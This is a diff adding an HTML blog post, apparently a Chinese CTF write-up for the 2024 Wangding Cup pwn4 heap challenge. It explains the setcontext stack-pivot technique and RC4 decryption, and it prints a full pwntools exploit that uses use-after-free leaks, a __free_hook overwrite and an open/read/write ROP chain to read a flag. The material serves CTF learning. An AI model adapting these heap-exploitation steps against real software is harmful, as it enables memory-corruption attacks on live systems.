@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>setcontext 网鼎杯青龙组初赛pwn4 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">setcontext 网鼎杯青龙组初赛pwn4</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 6, 2024&nbsp;&nbsp;15:59:45</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/heap/">heap</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h1><p>setcontext用于恢复寄存器和栈的一个函数，类似于srop中<code>sigreturn</code>，主要利用setcontext+53的位置来伪造栈空间来构造rop链。即给rsp寄存器传参</p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/1.png" alt="1"></p>
+<p>libc-2.29之前setcontext是通过rdi来索引的，libc-2.29之后rdi变为rdx</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>程序开启了沙箱，无法直接<code>system(&quot;/bin/sh&quot;)</code>来获得shell，或者是需要构造rop链来实现orw获得flag时，可以考虑利用setcontext构造一个fake_stack</p>
+<p>能知道heap_base的地址和libc_base的地址即可利用</p>
+<ul>
+<li><p>先劫持free_hook，使其指向setcontext+53的位置</p>
+</li>
+<li><p>在堆中传入0xa0个填充字符+fake_stack的地址+返回地址</p>
+</li>
+<li><p>调用free，释放掉上述的堆块，此时rdi为上述堆块的地址，rdi+0xa0正好为fake_stack的地址，rdi+0xa8为返回地址</p>
+</li>
+<li><p>之后<code>mov rsp,[rdi+0xa0]</code>伪造出fake_stack,<code>mov rcx,[rdi+0xa8];push rcx</code>使rcx为栈顶空间，之后再次ret，返回到rcx即<code>rdi+0xa8</code>的地址位置</p>
+</li>
+<li><p>fake_stack中的数据可写在另一个chunk中，这样知道了heap_base即可知道fake_stack的地址</p>
+</li>
+</ul>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>2024网鼎杯青龙组初赛pwn4</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/2.png" alt="2"></p>
+<p>main函数，禁用execve，开始需要输入用户名和密码，cmp中调用<code>strlen()</code>来比较前几位字符，若前几位相同，则会打印<code>Invalid username length</code>否则打印<code>Invalid username</code>因此可以类似于爆破canary一样爆破username和password</p>
+<p>结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = <span class="string">&quot;4dm1n&quot;</span></span><br><span class="line">password = <span class="string">&quot;985da4f8cb37zkj&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>之后就是堆的部分，四功能齐全</p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/3.png" alt="3"></p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/4.png" alt="4"></p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/5.png" alt="5"></p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/6.png" alt="6"></p>
+<p>在输入数据里会有一个加密，同样的，输出里也会有一个加密，free后会恢复加密。这就导致了如果利用UAF直接泄露地址，会泄露出加密的地址，如果edit伪造一个地址，也会被加密，导致成为一个非法地址</p>
+<h2 id="rc4加密"><a href="#rc4加密" class="headerlink" title="rc4加密"></a>rc4加密</h2><p>该题目的加密手法是rc4加密</p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/9.png" alt="9"></p>
+<p>rc4加密首先会有一个密钥，如图密钥为<code>s4cur1ty_p4ssw0rd</code></p>
+<p>之后会对密钥进行处理，来生成一个密钥流，利用密钥流对明文进行加密</p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/7.png" alt="7"></p>
+<p><img src="/../image/setcontext-%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84%E5%88%9D%E8%B5%9Bpwn4/8.png" alt="8"></p>
+<p>rc4加密有以下特点</p>
+<ul>
+<li>rc4为对称加密，加密解密用一个密钥</li>
+<li>rc4甚至加密解密是同一个算法，意味着对同一组数据加密两次相当于没有进行加密</li>
+<li>原文密文长度一样，若对密文的一部分进行解密，解密的结果仍是原文相对应的部分</li>
+</ul>
+<p>可以利用python来辅助解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">decryted</span>): <span class="comment">#加密</span></span><br><span class="line">    key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">    cipher = ARC4.new(key=key)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(decryted)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted</span>): <span class="comment">#解密</span></span><br><span class="line">    key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">    cipher = ARC4.new(key=key)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(encrypted)</span><br></pre></td></tr></table></figure>
+
+<p>由于rc4的特性实际上两个函数一样，因此只需写一个即可</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment">#e=ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;challenge.basectf.fun&#x27;,49570)#libc 2.35 0 3.7</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line">getaddress = <span class="keyword">lambda</span> num : u64(r.recv(num).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#=================================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">ch</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;&gt; \n&quot;</span>, <span class="built_in">str</span>(ch).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the key: \n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;nput the value size: \n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the value: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the key: \n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the key: \n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the key: \n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    content=decrypt(content)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input the value: \n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">decryted</span>):</span><br><span class="line">    key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">    cipher = ARC4.new(key=key)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(decryted)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Input your username:\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4dm1n&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your password:\n&quot;</span>,<span class="string">&quot;985da4f8cb37zkj&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">   add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">   free(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">ru(<span class="string">&quot;[7,&quot;</span>)</span><br><span class="line">libcbase=rc(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libcbase=u64(decrypt(libcbase))-(<span class="number">0x70f2107ebca0</span>-<span class="number">0x70f210400000</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&quot;[2,&quot;</span>)</span><br><span class="line">heapbase=u64(decrypt(rc(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))-<span class="number">0x1780</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heapbase))</span><br><span class="line">fakestack=heapbase+<span class="number">0x1780</span></span><br><span class="line"></span><br><span class="line">ret=libcbase+<span class="number">0x8aa</span></span><br><span class="line">rdi=libcbase+<span class="number">0x000000000002164f</span></span><br><span class="line">rsi=libcbase+<span class="number">0x0000000000023a6a</span> </span><br><span class="line">rdx=libcbase+<span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">payload=flat(rdi,fakestack+<span class="number">0x98</span>,rsi,<span class="number">0</span>,rdx,<span class="number">0</span>,libcbase+libc.sym[<span class="string">&quot;open&quot;</span>])</span><br><span class="line">payload+=flat(rdi,<span class="number">3</span>,rsi,fakestack+<span class="number">0xa0</span>,rdx,<span class="number">0x30</span>,libcbase+libc.sym.read)</span><br><span class="line">payload+=flat(rdi,<span class="number">1</span>,rsi,fakestack+<span class="number">0xa0</span>,libcbase+libc.sym.write)+<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#edit(6,p64(libcbase+0x000000000052085))#setcontext</span></span><br><span class="line">edit(<span class="number">6</span>,p64(libcbase+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x100</span>,(<span class="number">0xa0</span>*<span class="string">b&#x27;a&#x27;</span>+p64(fakestack)+p64(ret)))<span class="comment">#rdi+0xa0 rdi+0xa8</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x100</span>,decrypt(p64(libcbase+<span class="number">0x000000000052085</span>)))<span class="comment">#此处是对free_hook处进行修改，由于free_hook在源程序中访问不到，此处也不会被程序加密，因此只需要传输原文即可</span></span><br><span class="line"><span class="comment">#add(12,0x200,&#x27;a&#x27;)</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>由于地址的随机性，导致有时候地址会被加密出<code>\n</code>截断后续内容</p>
+<p>原题中最后orw的flag是flag.txt</p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/sandbox/"># sandbox</a>
+                    
+                        <a href="/tags/heap/"># heap</a>
+                    
+                        <a href="/tags/UAF/"># UAF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/03/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/">利用proc/self/mem实现任意地址写</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
